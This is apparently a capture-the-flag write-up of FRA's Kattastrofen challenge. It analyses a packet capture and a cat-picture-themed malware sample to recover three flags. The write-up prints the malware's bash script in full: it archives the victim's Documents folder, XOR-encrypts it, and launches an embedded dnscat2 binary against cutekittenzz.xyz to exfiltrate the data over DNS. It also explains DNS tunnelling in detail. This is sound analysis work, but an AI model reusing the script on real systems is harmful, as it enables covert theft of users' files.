+++
title = "FRA Kattastrofen"
date = "2026-02-22"
#dateFormat = "2006-01-02" # This value can be configured for per-post date formatting

description = "My writeup for FRA:s Kattastrofen challange. I found all 3 flags!"
showFullContent = false
draft = false
+++
>En statstjänsteman på en skyddsvärd myndighet är svag för bilder på kattungar.
>I sin iver att ta del av fler sådana bilder, har hen råkat ladda ned något som
>inte var bra. Inte alls bra. Vi misstänker att skadlig kod har använts för att
>exfiltrera topphemlig data från myndigheten. Analysera nätverkstrafiken för att
>ta reda på vad som har hänt.
>
>Utmaningen innehåller tre flaggor på formen /flagga[1-3]{[a-zå-ö0-9_!]+}/ - kan
>du hitta dem?
>
>Skicka in din lösning till rekrytering@fra.se, även om du inte lyckas hitta
samtliga flaggor!
# First flag
The first flag was found using the hint provided in the challenge description. A public servant had downloaded malware he believed to be pictures of cats. Based on that, I decided to inspect the downloaded files in Wireshark.

![The downloaded files](/FRA_Kattastrofen/malwaredownloade.png)

As shown in the image above, the ZIP file looked suspicious. I downloaded it and discovered that it was password protected.

My first instinct was to use `John the Ripper`, so I started setting up `zip2john` on my SIFT machine. However, after cloning the required GitHub repositories, I ran into multiple dependency issues and missing libraries. Rather than troubleshooting all of that, I took a lazier approach.

I searched the packet capture for frames containing the string `pass` and it worked.

![Found zip password](/FRA_Kattastrofen/zippassword.png)

Inside the archive, there was a file named `flag` containing the flag:

`flagga1{klassiska_lösenord_för_100}`
# Second Flag
After extracting the ZIP file, I noticed that every image had a thumbnail except number 3. That immediately felt suspicious. 

Using the terminal and listing the files with the `ls` command also revealed that this file was executable. To confirm what it actually was, I used the `file` command.

![Suspicious kitten PNG in terminal](/FRA_Kattastrofen/suspiciouskittenimage.png)

Aha! It turned out to be a shell script. This was most likely the downloaded malware.

Inspecting the Bash script showed that it contained a Base64-encoded key as well as Base64-encoded data. The script decodes the data and writes it to a file named `mjau`, then makes that file executable using the `chmod +x` command.

```bash
#!/bin/bash

D=$(dirname "$0")
eog "$D/kitten-9.jpg" &

key="P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU="
echo $key |base64 -d > /tmp/key
tar cf - $HOME/Documents > /tmp/exfil.tar
echo "EXFIL $(date)" > /tmp/exfil.dat
echo "SIZE: $(stat -c%s /tmp/exfil.tar)" >> /tmp/exfil.dat
md5sum /tmp/exfil.tar >> /tmp/exfil.dat
echo "BEGIN DATA" >> /tmp/exfil.dat
paste <(od -An -vtu1 -w1 /tmp/exfil.tar) <(while :; do od -An -vtu1 -w1 /tmp/key; done) \
  | LC_ALL=C awk 'NF!=2{exit}; {printf "%c", xor($1, $2)}' | base64 >> /tmp/exfil.dat
echo "END DATA" >> /tmp/exfil.dat

base64 -d > mjau << 'EOM'
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAgCkAAAAAAABAAAAAAAAAACgrBQAAAAAAAAAAAEAAOAAN
AEAAJgAlAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA2AIAAAAAAADYAgAAAAAAAAgA
AAAAAAAAAwAAAAQAAAAYAwAAAAAAABgDAAAAAAAAGAMAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAbAAAAAAAAoBsAAAAAAAAAEAAA
AAAAAAEAAAAFAAAAACAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAaQBAAAAAAABpAEAAAAAAAAQAAAA
AAAAAQAAAAQAAAAA0AEAAAAAAADQAQAAAAAAANABAAAAAAC4fgAAAAAAALh+AAAAAAAAABAAAAAA
AAABAAAABgAAABBXAgAAAAAAEGcCAAAAAAAQZwIAAAAAAFAMAAAAAAAAAA0AAAAAAAAAEAAAAAAA
AAIAAAAGAAAAaFsCAAAAAABoawIAAAAAAGhrAgAAAAAA8AEAAAAAAADwAQAAAAAAAAgAAAAAAAAA
BAAAAAQAAAA4AwAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAACAAAAAAAAAACAAAAAAAAAAE
.
.
.
EOM
chmod +x mjau
./mjau cutekittenzz.xyz
```
Decoding the long block of data with `base64 -d < mjauB64 > mjau` produced an `ELF` binary.

After loading it into Ghidra, I noticed a lot of references to `dns` and general network activity. I did not fully understand the entire control flow, but it seemed unnecessary to reverse engineer the whole program. The presence of functions such as `can_i_transmit_yet` and `you_can_transmit_now` strongly suggested that it was establishing some kind of communication channel.

I also found several references to `dnscat`. Inspecting the `usage` function appeared to confirm that this was indeed a `dnscat2` binary.

![dnscat2 usage function](/FRA_Kattastrofen/dnscatusage.png)

Looking at the the documentation by Kali for `dnscat2` shows that it establishes an encrypted command-and-control channel over the DNS protocol. That aligns well with the DNS-related artifacts observed in the binary.
> # dnscat2
>This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.

The `dnscat2` binary was executed with the domain `cutekittenzz.xyz` as its argument:

`./mjau cutekittenzz.xyz`

This aligns with the DNS packets being sent immediately after the malware was downloaded.

![DNS protocol packets being sent after malware was downloaded](/FRA_Kattastrofen/dnsAfterMalwareDownload.png)

Inspecting the DNS traffic shows that `cutekittenzz.xyz` is heavily referenced.

![cutekittenzz.xyz in dns packets](/FRA_Kattastrofen/cutekittenzzIN_DNS.png)

# My understanding of dnscat2 and the Bash script

To be honest, my Bash skills are not the strongest, and I had never heard of `dnscat2` before this challenge. The following section reflects my understanding of the script and `dnscat2` after doing some research.

## dnscat2

`dnscat2` is a tool used to establish an encrypted command-and-control (C2) channel over the DNS protocol. Since most networks allow DNS traffic and often do not monitor it closely, DNS can be abused to create a covert remote connection or to exfiltrate data. This technique is commonly referred to as `DNS tunneling`, and `dnscat2` is an implementation of that technique.

### How DNS tunneling works

DNS tunneling works by encoding data inside DNS queries. These queries are sent to an attacker-controlled DNS server. A typical `dnscat2` query might look like:

`<encoded_request>.hacker.com` with record type `MX` (Mail Exchange).

When the malware sends this query, the local DNS resolver does not know the `MX` record for `<encoded_request>.hacker.com`. It then follows the normal DNS resolution process:

1. The resolver queries a `root nameserver` to determine which servers are responsible for the `.com` top-level domain (TLD).
2. The root server responds with `NS` records for the `.com` TLD servers.
3. The resolver queries a `.com` TLD server to determine which authoritative nameservers are responsible for `hacker.com`.
4. The TLD server responds with `NS` records for the authoritative nameservers of `hacker.com`.
5. Finally, the resolver queries the authoritative nameserver for `hacker.com`.

The thing is that the authoritative nameserver for `hacker.com` is attacker-controlled. When the query requests the `MX` record for `<encoded_request>.hacker.com`, the attacker-controlled server responds with something like:

`<encoded_response>.hacker.com`

That response propagates back through the DNS hierarchy to the infected host. The malware then decodes `<encoded_response>`, which may contain commands, acknowledgments, or other data. The malware can also exfiltrate data simply by embedding it in outgoing DNS queries, without necessarily expecting meaningful responses.

### dnscat2 packet structure

`dnscat2` uses a session-oriented communication model similar to TCP, with `SYN`-like packets to establish a session and `FIN`-like packets to terminate it.

For a `SYN` packet, the encoded payload structure is:

1. Packet ID (16 bits)  
2. Message Type (8 bits, `0x00`)  
3. Session ID (16 bits)  
4. Initial sequence number (16 bits)  
5. Options (16 bits)  
6. Optional additional data if `OPT_NAME` is set  

For a message packet, the structure is:

1. Packet ID (16 bits)  
2. Message Type (8 bits, `0x01`)  
3. Session ID (16 bits)  
4. Sequence number (16 bits)  
5. Acknowledgment number (16 bits)  
6. Message data  

From this, I concluded that the first 9 bytes of the encoded DNS subdomain represent control and session metadata. If I want to extract the actual message content, I need to:

- Identify packets where the third byte (Message Type) is `0x01`, indicating a message packet.  
- Extract the bytes following the initial 9-byte header, as those contain the message data.
## The bash script
With some help from google and chatgpt about the weird `paste`, loop part thing syntax this is how I understand the bash script:
```bash
D=$(dirname "$0") #Get directory from where script is running from. 
eog "$D/kitten-9.jpg" & #Open kitten-9.jpg (user pressed kitten 11 so trick him) in Eye of Gnome and continue with the commands below.

key="P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU=" #Key used for simple repeated key xor later. 
echo $key |base64 -d > /tmp/key #decode key and store in a temp key file
tar cf - $HOME/Documents > /tmp/exfil.tar #compress the users documents folder using tar into a exfil.tar file
echo "EXFIL $(date)" > /tmp/exfil.dat #create a exfil.dat file and put the date in the file.
echo "SIZE: $(stat -c%s /tmp/exfil.tar)" >> /tmp/exfil.dat #append the size of the tar file to the exfil.dat.
md5sum /tmp/exfil.tar >> /tmp/exfil.dat #calc the md5 hash of the tar and append to exfil.dat
echo "BEGIN DATA" >> /tmp/exfil.dat #appened a line that says that the data now starts
```
The loop needs it own explanation:
```bash
paste <(od -An -vtu1 -w1 /tmp/exfil.tar) <(while :; do od -An -vtu1 -w1 /tmp/key; done) \
  | LC_ALL=C awk 'NF!=2{exit}; {printf "%c", xor($1, $2)}' | base64 >> /tmp/exfil.dat
echo "END DATA" >> /tmp/exfil.dat
```

`od -An -vtu1 -w1 /tmp/exfil.tar` is used to display the `exfil.tar` file as an octaldump, basically displaying the bytes ocatl. The command arguments used 
- `-An` removes the offset information so only the bytes are shown in octal.
- `-v` includes duplicate values, `-vtu1` includes duplicate values and specifies an output format of an `unsigned decimal` 1 byte at a time. Basically print `0-255 *space* next value between 0-255` and so on.
- `-w1` says to output 1 byte per line.   
This output ends up lookings something along the lines of:
```
 110
 115
  47
  34
  10
  32
  32
```
The same is done for the key file except it is infinitely long because of the while loop.
`<(command)` is something called `process substitution`. It allows processes output to appear as a file name. Instead of `command file1 file2` I could do `command1 <(command2) <(command3)`. Now `command2` and `command3` appears as files that I can use for `command1`. 

What pase `paste` then does is that it "join files horizontally", like this:
```
A
B
C
``` 
AND
```
1
2
3
```
Turns into (notice space)
```
A 1
B 2
C 3
```
The `while` loop never terminates, but from what I understood, `paste` stops once it can no longer match corresponding lines.

The joined lists are then piped into `awk`, which XORs the values, performing `A XOR 1`. The result is Base64-encoded and appended to `exfil.dat`. I do not think it is probably necessary to analyze every parameter of the `awk` command in detail, so I will skip that part.

# Back to finding flag 2

Now that I understand the overall workflow — at least at a high level — I can develop a strategy.

This was my plan:

1. Export the queries sent by the infected system separately using `tshark`.
2. Export the responses received from the compromised authoritative nameserver separately.
3. Write a Python script to extract the encoded portion.
4. Remove the first 9 bytes from each message.
5. Decode the remaining data from hex to a string.
6. Locate the Base64-encoded message and decode it.
7. Apply the previously recovered key in the same manner it was originally used for encryption.

## Step 1 and 2

These steps were completed using:

`tshark -r kattastrofen.pcap -Y "dns && ip.src==[VICTIM OR ATTACKER]" -T fields -e "[dns.qry.name/dns.mx.mail_exchange]" > [VICTIM OR ATTACKER]`

I also noticed that each DNS packet could contain multiple encoded segments separated by dots. 

After experimenting with an online decoder, I discovered that only the first segment needs to have its initial 9 bytes removed. The remaining segments can be decoded directly without stripping any additional header bytes.
## Step 3, 4, and 5

Initially, I thought I would need to explicitly identify the byte indicating a message packet (`0x01`), but the extraction process worked without doing so.

Interestingly, the `dnscat2` data in this case did not appear to be encrypted.

```python
victim = open("victim")
server = open("server")
victim_decoded = open("victimDecoded",'w')
server_decoded = open("serverDecoded",'w')
victim_lines = []
server_lines = []
for line in victim.readlines():
    query_parts = line.split(".")
    removed_domain = [qp for qp in query_parts if qp != "cutekittenzz" and qp != "xyz"]
    for i in range(0,len(removed_domain)):
        try:
            if i == 0:
                decoded = bytes.fromhex(removed_domain[i][18:]).decode('utf-8') #Remove communication parts
                victim_lines.append(decoded)
            else:
                decoded = bytes.fromhex(removed_domain[i]).decode('utf-8')
                victim_lines.append(decoded)
        
        except:
            continue 
       
victim_decoded.write(''.join(victim_lines))
victim_decoded.flush()

for line in server.readlines():
    query_parts = line.split(".")
    removed_domain = [qp for qp in query_parts if qp != "cutekittenzz" and qp != "xyz"]
    for i in range(0,len(removed_domain)):
        try:
            if i == 0:
                decoded = bytes.fromhex(removed_domain[i][18:]).decode('utf-8') #Remove communication parts
                server_lines.append(decoded)
            else:
                decoded = bytes.fromhex(removed_domain[i]).decode('utf-8')
                server_lines.append(decoded)
        
        except:
            continue
       
server_decoded.write(''.join(server_lines))
server_decoded.flush()
```
## Step 6 and 7
Using nano I removed everything but the base64:ed `exfil.tar` file and decoded it. I created a python script to xor with the the key that I also decoded:
```python
encrypted = open("victimDataEncrypted",'rb').read()
key = open("key",'rb').read()

data = open("data",'wb')

key_index = 0
for byte in encrypted:
    decypted_byte = byte ^ key[key_index]
    data.write(bytes([decypted_byte]))
    data.flush()
    key_index += 1
    key_index = key_index % len(key)
```
Which gave me a file that the `file` command says `data: POSIX tar archive (GNU)`.
Using `tar -xf data -C extracted/` I find a pdf called `topphemligt.pdf`. Exciting!!!
The pdf contains the flag:
![Flag 2 in a picture of a kitten](/FRA_Kattastrofen/flag2.png)

# Flag 3
I found a reference to javascript in the strings found in the pdf file and a long hexstring. I decoded the hexstring and found:
```
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+.........
```
I had no clue what this was and if it was normal for a pdf.

I asked chatgpt what it was and it told me about `JSFUCK`. This is a technique used to obsfucate javascript code. 

I am on the right track for sure!

Using an online decoder I found:

```javscript
const data = [0n, 16777216n, 963362762567186450219276n, 1227815285621149424943362n, 4251180420234710034485506n, 1227908978741191150735617n, 1228942000327703451209986n, 1229089574843243084713986n, 1229089574913611821027586n, 1276163323341699551654156n, 1170935903267323904n, 16393102643729268736n];
if(0.1 + 0.2 == 0.3){
  let str = "";   
  for(let x of data){ 
    str += x.toString(2).padStart(106, '0') + "\n";
  }   
  app.alert(str.replaceAll("0", " ").replaceAll("1",".")); 
}
```
Additionally I suspected that the `if` condition will always be true. But turns out when I run it in an online javascript compiler the condition is not true, and this seems to be because of how javascript handles `floats`. For example a user on `freecodecamp.org` wondered why `2.05 * 100` was equal to `204.99999999999997` instead of `205`. 
I decided to just remove the condition and let it print `str`. 

And there it is, the third and final flag:
```
                                                                  .                        
                          ..  ..                            ...     ..           .     .         .    ..  
                         .     .                           .   .   .                  ..         .      . 
                        ...    .    ...   ....  ....  ...      .   .   ....     ..   . . .   .   .      . 
                         .     .       . .   . .   .     .   ..   .    . . .     .  .  . .   .   .       .
                         .     .    .... .   . .   .  ....     .   .   . . .     . .   . .   .   .      . 
                         .     .   .   . .   . .   . .   .     .   .   . . .     . ..... .   .          . 
                         .     .   .   . .   . .   . .   . .   .   .   . . .     .     . .   .   .      . 
                         .    ...   ....  ....  ....  ....  ...     .. . . .     .     .  ....   .    ..  
                                             .     .                          .  .                        
                                          ...   ...                            ..                         
```
It is a bit hard to see but it says: `flagga3{mj4u!}` (I think).


